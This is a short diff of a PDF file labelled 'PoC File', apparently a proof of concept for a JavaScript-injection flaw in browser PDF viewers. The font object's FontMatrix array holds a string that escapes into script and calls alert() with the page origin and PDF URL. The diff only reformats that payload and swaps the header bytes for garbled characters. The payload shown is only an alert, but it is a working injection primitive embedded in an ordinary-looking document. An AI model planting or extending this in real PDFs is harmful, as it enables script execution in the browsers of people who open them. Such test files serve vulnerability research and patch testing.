@@ -1,5 +1,5 @@
 %PDF-1.7
-%âãÏÓ
+%ï¿½ï¿½ï¿½ï¿½
 1 0 obj
 << /Type /Catalog /Pages 2 0 R >>
 endobj
@@ -16,7 +16,7 @@ BT /F1 18 Tf 100 700 Td (PoC File) Tj ET
 endstream
 endobj
 5 0 obj
-<< /Type /Font /Subtype /Type1 /BaseFont /SNCSTG+CMBX12 /FontDescriptor 6 0 R /FontMatrix [1 2 3 4 5 (1\); alert(\''origin: ' + window.origin + ', pdf url: '\+(\ (window.PDFViewerApplication ? window.PDFViewerApplication.url : document.URL)\))] >>
+<< /BaseFont /SNCSTG+CMBX12 /FontDescriptor 6 0 R /FontMatrix [ 1 2 3 4 5 (1\); alert\('origin: '+window.origin+', pdf url: '+\(window.PDFViewerApplication?window.PDFViewerApplication.url:document.URL\)) ] /Subtype /Type1 /Type /Font >>
 endobj
 6 0 obj
 << /Type /FontDescriptor /FontName /SNCSTG+CMBX12 >>
